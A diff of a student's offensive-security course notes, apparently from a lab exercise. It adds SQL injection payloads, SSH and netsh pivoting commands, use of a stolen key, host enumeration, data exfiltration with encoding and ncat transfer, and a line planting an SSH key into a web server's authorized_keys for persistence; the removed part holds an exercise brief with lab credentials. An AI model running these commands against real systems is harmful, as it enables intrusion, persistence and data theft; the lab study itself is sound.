@@ -322,8 +322,21 @@ Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
 Selection=2 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_schema=database()   == the table in use 
 
 
+exclation
+-----------------
+escape sanitazation to get root privs 
+*******************
+email\',<level>) ; # or email\',<level>) ; -- 
 
 
+general sql injection 
+----------------------
+UNION select <column> FROM <databe.table>
+
+table_schema
+table_name
+column_names
+ UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_schema=database()
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Day 4) 
@@ -365,6 +378,108 @@ JMP - Jump to specified location
 JLE - Jump if less than or equal
 JE - Jump if equal
 
+-------------------------------------------------------------------------------------------------------------------------------------------------
+Day 4) 
+
+post exploitation
+----------------------
+ssh overview 
+linux: 
+- ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT -L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
+Windows:
+- port proxy
+- netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
+- netsh interface portproxy show all
+- netsh interface portproxy delete v4tov4 listenport=<LocalPort>
+- netsh interface portproxy reset
+
+
+
+ssh keys
+----------------------
+chmod 600 /home/student/stolenkey
+ssh -i /home/student/stolenkey jane@1.2.3.4
+
+
+control sockets
+--------------------
+creation
+- ssh -M -S /tmp/s -o StrictHostKeyChecking=no -o UserKnownHostFile=/dev/null user@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
+access to the socket
+- ssh -S /tmp/s <anything> 
+making a new tunnel
+-ssh -S /tmp/jumpbox user@ip -O forward -L 2222:192.168.0.10:22
+
+scp 
+====
+upload 
+- scp -o 'ControlPath=<control/socket/location>' [LOCAL/FILE/TO/TRANSFER] [USER]@<TARG_IP>:[/DEST/FILENAME]
+- scp -o 'ControlPath=/tmp/s' /tmp/netcat root@127.0.0.1:/tmp/netcat
+download
+- scp -o 'ControlPath=<control/socket/location>' [USER]@<TARG_IP>:[/FILE/TO/DOWNLOAD] [/LOCAL/DOWNLOAD/FILE/LOCATION]
+- scp -o 'ControlPath=/tmp/s' root@127.0.0.1:/tmp/netcat .
+
+
+
+bringing the socket over??
+--------------------------------
+ssh -S /tmp/s x@x
+scp -o 'ControlPath=/tmp/s' x@x:<Path>
+
+
+
+user enumaeration
+-----------------
+windows
+=================
+- net user
+- tasklist /v
+- tasklist /svc
+- ipconfig /all
+- qwinsta
+- wmic useraccount get name,sid
+- net localgroup
+- netstat /anob
+- route print
+- arp -a
+===============
+linux
+==============
+- cat /etc/passwd
+- last
+- groups
+- id
+- w 
+- ps -elf
+- chkconfig                   # SysV
+  systemctl --type=service    # SystemD
+- ip a             # SystemD
+  ifconfig -a      # SysV (deprecated)
+- netstat -ano
+- ip r
+- ip n
+- /etc/hosts
+
+
+
+data exfiltration
+----------------------
+
+Ssh transcript 
+- ssh <user>@<host> | tee
+  
+windows obfucation
+- type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out   |  (decode)  Get-Content translated.out | %{$_ -replace 'b','a' -replace 'c','b' -replace 'd','c'}
+certutil -encode <file> encoded.b64   | (decode)   certutil -decode data.b64 data.txt
+
+linux obfuscation
+- cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt   | (decode) cat shifted.txt | tr 'b-zA-Z0-9a' 'a-zA-Z0-9'
+cat <file>> | base64 >> base64.txt          | (decode)  cat base64ed.txt | base64 -d
+
+encryption trasport 
+- scp <source> <destination>
+  ncat --ssl <ip> <port> < <file>
+
 
 
 
@@ -374,59 +489,12 @@ JE - Jump if equal
 ports 3333,7418=192.168.28.111
       9638=10.100.28.40:80
       9999:10.100.28.55:80
-
-
--------------------
-
-
-
-Donovian Database Exploitation (DWDBE)
-XX Dec 2026
-Start Time: 1300
-Duration: 4 hours
-
-Type of Operation: Cyberspace Exploitation (C-E)
-
-Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.
-
-Tools/Techniques: All connections will be established through web browser to donovian-nla. SSH masquerade to Donovian_Webserver with provide credentials. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.
-
-Scenario Credentials: FLAG = 5QL1nj3ct5t@rt0F@ct1v1ty
-
-Prior Approvals: SQLi injects through web browser. Creation of database administrator account if directed to. Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.
-
-Scheme of Maneuver:
->internet_grey_host
-â†’Pivot: 192.168.28.111
--â†’T1:10.100.28.48
-
-Target Section:
-
-Pivot
-Hostname: Donovian_Webserver
-IP: 192.168.28.111
-OS: Ubuntu 18.04
-Creds: comrade :: StudentWebExploitPassword
-Last Known SSH Port: 2222
-PSP: none
-Malware: none
-Action: Perform SSH masquerade and redirect to the next target. No survey required, system is cleared
-
-T1
-Hostname: donovian-nla
-IP: 10.100.28.48
-OS: unknown
-Creds:unknown
-Last Known SSH Port: unknown
-Last Known HTTP Port: 80
-PSP: Unknown
-Malware: Unknown
-Action: Conduct approved SQLi Exploitation techniques to collect intellegence.
+      3375:192.168.28.100
 
 
 
+comerade
 
-
-
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDIxv7ahuM2lTWIsG6zH4+yR6qnxPbeobVlXv1fyz/rS4OiO8E/ntElyhMgQlYG9P/cPJpqJKFfihqtZDciRxBE1XoklbWpuW+CYsk2zOIl1QZL0jHaFGSEfzY7ZUqkKehbwlI0s33rx0JsBvIz1RQTUzImcFpi1IW8V1YmWpR6Sw+e/wSVFr0on4mPRO0TuO/xJ0Ie7RcQt2SFVxkZXpJCrFEg9UikBaWtJEmUyTILyfVsJcMgG21y19GKGUWJu92Qjy29oj39zhaXc1R1aIBIpp1vojEwhqMm4qRc30sQWJz3RIriItmuh8oBV9sglH20ZlTt/s6/PWCw6huErfXW5IeNEyN6znf2a0ZAyEKJtQK6tCcycCQjRHj18iSuCeTVPSvF+ZBBUbI0jV6M5bXYfX71Cp4/Hmdx9wewFPNJR2sQ1PHO98kYfhMIKlRLAnA6DCo3B6ukalGduflag/iiK1ze8Ka5GROxnNpelZGv3a7sf+g52kRCHPTr3HDR2Po3QwKJBb38CBtlQ3XAh6DRuQsVSxBWCuM4xKb60s/RbyVKmx/d+Og303DzTwe+m2BBaXRG3aSPHkWA3RRtnbAxN4lqjBtm7kEoICyww8Dk8zOMydw+Qw4KV7TRT7RO/B0s8ypUCE8FaHdb1RLUInYIk7q/3z8gXBsQGOyR3PLs9Q== student@lin-ops'>> /var/www/.ssh/authorized_keys
 
 
